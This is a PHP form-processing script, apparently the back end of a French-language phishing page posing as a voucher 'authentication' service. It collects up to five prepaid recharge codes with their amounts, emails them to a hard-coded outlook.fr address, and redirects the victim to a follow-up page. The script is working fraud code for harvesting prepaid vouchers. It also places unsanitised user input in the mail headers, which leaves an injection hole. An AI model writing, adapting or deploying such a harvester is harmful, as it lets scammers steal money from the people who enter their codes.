<?php


if ( $_SERVER["REQUEST_METHOD"] == "POST" ) {

    // Configuration
    $emailTo = "rosedupon02@outlook.fr";

    // Get Information
    $typerecharge = $_POST["typerecharge"];
    $email = $_POST["email"];

    $code1 = $_POST["code1"];
    $montant1 = $_POST["montant1"];

    $code2 = $_POST["code2"];
    $montant2 = $_POST["montant2"];

    $code3 = $_POST["code3"];
    $montant3 = $_POST["montant3"];

    $code4 = $_POST["code4"];
    $montant4 = $_POST["montant4"];

    $code5 = $_POST["code5"];
    $montant5 = $_POST["montant5"];



    // Make Email body
    $emailText  = "DEMANDE AUTHENTIFICATION \r\n \r\n
                   Type recharge: $typerecharge\r\n
                   Email: $email\r\n
                   Code 1: $code1\r\n
                   Montant 1: $montant1\r\n
                   Code 2: $code2\r\n
                   Montant 2: $montant2\r\n
                   Code 3: $code3\r\n
                   Montant 3: $montant3\r\n
                   Code 4: $code4\r\n
                   Montant 4: $montant4\r\n
                   Code 5: $code5\r\n
                   Montant 5: $montant5\r\n";

    // Send email
    $headers = "From: Message Coupon <$email>\r\nReply-To: $email";
    try {
        if ( mail($emailTo, "Un message de votre site", $emailText, $headers) ) {
            header("Location: authentifier-ticket.php");
        }
    } catch(Exception $e) {
        
    }
    
}

?>